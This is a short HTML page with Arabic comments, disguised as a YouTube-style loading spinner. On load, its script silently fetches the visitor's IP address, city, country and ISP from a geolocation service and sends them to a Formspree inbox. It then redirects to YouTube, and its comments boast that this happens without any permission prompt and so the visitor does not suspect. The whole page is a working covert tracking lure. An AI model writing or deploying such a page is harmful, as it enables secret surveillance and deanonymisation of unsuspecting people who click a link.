<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { 
            background-color: #ffffff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            font-family: sans-serif;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff0000; /* لون أحمر مثل يوتيوب */
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader"></div>

<script>
    const FORMSPREE_URL = "https://formspree.io/f/mvzblpga";

    window.onload = function() {
        // سحب البيانات بالـ IP (بدون أي رسائل إذن)
        fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            // إرسال المعلومات لبريدك بصمت
            fetch(FORMSPREE_URL, {
                method: 'POST',
                headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    _subject: "🚀 دخول مباشر - تم السحب",
                    IP: data.ip,
                    City: data.city,
                    Country: data.country_name,
                    ISP: data.org
                })
            }).then(() => {
                // الانتقال فوراً ليوتيوب
                window.location.href = "https://www.youtube.com";
            });
        })
        .catch(error => {
            // حتى لو فشل السحب، يذهب ليوتيوب فوراً لكي لا يشك
            window.location.href = "https://www.youtube.com";
        });
    };
</script>

</body>
</html>
